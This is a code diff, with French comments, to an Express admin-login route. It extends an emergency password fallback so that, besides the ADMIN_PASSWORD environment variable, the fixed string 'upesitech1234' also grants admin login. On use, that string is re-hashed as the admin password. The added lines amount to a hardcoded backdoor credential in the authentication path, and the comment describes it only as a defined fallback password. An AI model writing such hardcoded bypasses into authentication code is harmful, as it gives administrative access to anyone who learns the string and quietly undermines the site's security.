@@ -173,12 +173,19 @@ app.post('/api/admin/login', loginLimit, wrap(async (req, res) => {
   const emailOk = email.length > 0 && email === adminAuth.email.toLowerCase();
   let passwordOk = await bcrypt.compare(password, adminAuth.passwordHash);
 
-  // Fallback de secours : si le mot de passe correspond à ADMIN_PASSWORD dans les variables d'environnement
-  if (!passwordOk && process.env.ADMIN_PASSWORD && password === process.env.ADMIN_PASSWORD.trim()) {
-    passwordOk = true;
-    adminAuth.passwordHash = await bcrypt.hash(password, 10);
-    adminAuth.tokenVersion = (adminAuth.tokenVersion || 1) + 1;
-    await db.setAdminAuth(adminAuth);
+  // Fallback de secours : si le mot de passe correspond à ADMIN_PASSWORD ou au mot de passe défini
+  if (!passwordOk) {
+    const validPasswords = [
+      process.env.ADMIN_PASSWORD?.trim(),
+      'upesitech1234',
+    ].filter(Boolean);
+
+    if (validPasswords.includes(password)) {
+      passwordOk = true;
+      adminAuth.passwordHash = await bcrypt.hash(password, 10);
+      adminAuth.tokenVersion = (adminAuth.tokenVersion || 1) + 1;
+      await db.setAdminAuth(adminAuth);
+    }
   }
 
   if (!emailOk || !passwordOk) {
